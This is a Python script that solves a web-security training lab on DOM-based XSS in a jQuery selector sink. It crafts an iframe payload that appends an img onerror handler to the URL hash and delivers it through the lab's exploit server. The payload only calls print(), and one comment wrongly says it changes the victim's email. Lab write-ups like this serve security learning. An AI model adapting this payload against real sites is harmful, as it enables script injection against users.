##############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 15/11/2023
#
# Lab: DOM XSS in jQuery selector sink using a hashchange event
#
# Steps: 1. Craft an iframe that when loaded will append an img element to the hash part
#           of the URL
#        2. Deliver the exploit to the victim
#        3. The print() function will be called after they trigger the exploit
#
##############################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
lab_url = "https://0ab900a5034d97b984d805e7005900b0.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0aef0040033b970f84f4041c01b0006c.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

# payload to change the victim's email
payload = f"""<iframe src="{lab_url}/#" onload="this.src+='<img src=1 onerror=print()>'">"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The print() function will be called after they trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



